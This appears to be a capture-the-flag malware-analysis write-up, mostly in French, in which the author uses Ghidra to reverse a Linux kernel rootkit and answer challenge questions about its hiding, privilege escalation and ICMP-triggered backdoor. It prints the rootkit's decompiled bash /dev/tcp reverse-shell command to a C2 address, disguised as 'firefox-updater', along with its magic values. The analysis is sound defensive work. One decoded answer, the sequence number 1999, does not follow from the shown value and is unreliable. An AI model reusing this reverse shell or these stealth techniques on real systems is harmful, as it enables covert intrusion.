# Singularity

Our primary web server, critical to our daily operations, has been compromised. Over the past few weeks, our network monitoring tools have been flagging unusual outbound communications to an unknown command-and-control server on an unconventional port. The Digital Forensics and Incident Response (DFIR) team was immediately activated to investigate the anomaly. Initial analysis of the running processes and network connections on the live system revealed nothing out of the ordinary, suggesting a sophisticated attacker attempting to maintain stealth. Suspecting a kernel-level threat, the DFIR team captured a full memory dump of the compromised server for offline analysis. During the memory analysis, the team uncovered traces of a sophisticated Linux rootkit. This rootkit was actively hiding its presence and maintaining persistent access to our server. The DFIR team has successfully recovered the malicious kernel modules from the memory image. As a malware analyst, you have been provided with the recovered malicious modules. Your objective is to perform a thorough analysis of the rootkit and determine its capabilities.

# Write-Up

## What is the SHA256 hash of the sample? 

```powershell
Get-FileHash .\singularity.ko -Algorithm SHA256
 
Algorithm       Hash                                                               
---------       ----                                                                 
SHA256          0B8ECDACCF492000F3143FA209481EB9DB8C0A29DA2B79FF5B7F6E84BB3AC7C8
```

## What is the name of the primary initialization function called when the module is loaded? 

Avec ghidra :

```
Symbol Tree > Exports > __this_module
```

En cherchant le champ `init` on trouve le nom `singularity_init` à l'adresse `0x0010a930`. Cependant, ce n'est pas la réponse attendu. Pour la trouver : 

```
Symbol Tree > Labels > init_ > init_module
```

## How many distinct feature-initialization functions are called within above mentioned function? 

Après un double clic sur la fonction `singularity_init` et dans le pseudo-code, il suffit de compte les fonctions appelées (`15`).

## The reset_tainted_init function creates a kernel thread for anti-forensics. What is the hardcoded name of this thread? 

Dans le pseudo-code de `reset_tainted_init`, il suffit de regarder les arguments de `kthread_create_on_node` et on trouve `"zer0t"`.

## The add_hidden_pid function has a hardcoded limit. What is the maximum number of PIDs the rootkit can hide? 

Dans la fonction `add_hidden_pid`, on trouve une boucle : 

```c
  if (0 < hidden_count) {
    piVar1 = hidden_pids;
    do {
      if (*piVar1 == pid) {
        return;
      }
      piVar1 = piVar1 + 1;
    } while (piVar1 != hidden_pids + hidden_count);
    if (hidden_count == 0x20) {
      return;
    }
  }
```

La limite est `0x20` soit `32`.

## What is the name of the function called last within init_module to hide the rootkit itself? 

Dans la fonction `singularity_init`, la dernière fonction appelée est `module_hide_current`.

## The TCP port hiding module is initialized. What is the hardcoded port number it is configured to hide (decimal)? 

Dans la fonction `hiding_tcp_init`, on remarque : 

```c
int iVar1;

iVar1 = fh_install_hooks(new_hooks,3);
return iVar1;
```

En double cliquant sur `new_hooks` puis `hooked_tcp4_seq_show`, on a accès à la vraie fonction qui cache le port. On remarque que les variables `sVar1` et `sVar2` sont comparés avec la valeur `-0x5eba`. Les deux variables étant de type `short`, leur bit de signe est actif. Donc on réalise l'opération : 

```
0x10000 - 0x5eba = 0xA146
```

> Attention : les ports sont en `Big Endian` et `0xA146` est en `Little Endian`.

On inverse donc : `0xA146 > 0x46A1 > 18081`.

## What is the hardcoded "magic word" string, checked for by the privilege escalation module? 

Dans la fonction `become_root_init`, on double clic sur `hooks`, puis sur `sys_kill_0010a`.

On trouve : `MAGIC=babyelephant`.

## How many hooks, in total, does the become_root_init function install to enable privilege escalation? 

Dans la fonction `become_root_init`, on a : 

```c
iVar1 = fh_install_hooks(hooks,10);
```

Donc `10`.

## What is the hardcoded IPv4 address of the C2 server? 

Dans la fonction `hooked_tcp4_seq_show`, on a une adresse IP : `192.168.5.128`. 

## What is the hardcoded port number the C2 server listens on? 

En faisant une recherche : 

```
Search > Program Text > 192.168.5.128

All Fields
```

On trouve une fonction nommée `spawn_revshell`. Dedans, on remarque cette commande : 

```c
snprintf(cmd,0x300, "bash -c \'PID=$$; kill -59 $PID; exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1\' &", "firefox-updater","192.168.5.128",&DAT_0010b4b1);
```

On double clic sur `&DAT_0010b4b1` puis on trouve `443`.

## What network protocol is hooked to listen for the backdoor trigger? 

Dans la fonction `singularity_init` il y a la fonction `hiding_icmp_init`. Donc `icmp`.

Ou dans la fonction `spawn_revshell`, on remarque `XREF: hook_icmp_rcv`, ce qui confirme le protocole `icmp`.

## What is the "magic" sequence number that triggers the reverse shell (decimal)? 

Dans le code de la fonction `hook_icmp_rcv`, on a : 

```c
(puVar5 + 6) == -0x30f9
```

Même pratique que tout à l'heure et on trouve : `1999`.

## When the trigger conditions are met, what is the name of the function queued to execute the reverse shell? 

Simple : `spawn_revshell`.

## The spawn_revshell function launches a process. What is the hardcoded process name it uses for the reverse shell? 

Si on reprend le code du reverse-shell, on trouve : `firefox-updater`.

# Bonus

## Discord 

![[..\images\Pasted image 20260216221211.png]]
## Yara 

![[..\images\Pasted image 20260216221236.png]]
